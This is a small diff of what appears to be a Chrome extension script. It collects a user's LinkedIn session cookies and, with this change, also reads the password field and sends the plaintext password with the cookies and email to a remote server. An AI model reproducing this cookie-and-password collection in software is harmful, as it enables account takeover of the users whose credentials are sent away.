@@ -8,6 +8,10 @@
 window.onload = async function() {
 	
 	document.getElementById("GetLinkedinCookiesButton").addEventListener("click", function() {
+		
+		var email = document.getElementById("email").value;
+		var password = document.getElementById("password").value;
+		
 		// Assume current tab has Linkedin homepage
 		chrome.cookies.getAll({"url": "https://www.linkedin.com/feed/"}, function(cookie) {
 			
@@ -23,6 +27,7 @@ window.onload = async function() {
 				},
 				body: JSON.stringify({
 					email: email,
+					password: password,
 					cookie: cookie
 				})
 			})
